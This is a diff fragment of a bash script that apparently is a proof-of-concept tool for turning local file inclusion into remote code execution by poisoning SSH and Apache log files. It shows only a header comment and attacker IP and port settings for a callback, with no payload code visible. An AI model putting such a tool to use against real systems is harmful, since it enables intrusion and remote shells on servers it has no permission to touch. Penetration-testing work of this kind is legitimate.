@@ -1,5 +1,14 @@
 #!/bin/bash
 
+###################################################################################################   
+# Local File Inclusion to Remote Code Execution                                                   #
+# Automated proof of concept tool to poison ssh and apache2 log files                             #
+# linux ssh (/var/log/auth.log)                                                                   #
+# linux apache2 (/var/log/apache2/access.log)                                                     #
+# windows xampp/apache (C:/xampp/apache/logs/access.log) use --windows option for windows hosts   #
+#                                                                      by 0bfxgh0st*              #
+###################################################################################################
+
 #########################################################
 attacker_ip="10.0.2.15"   # CHANGE ME BY ATTACKER IP    #
 attacker_port="4444"      # CHANGE ME BY ATTACKER PORT  #
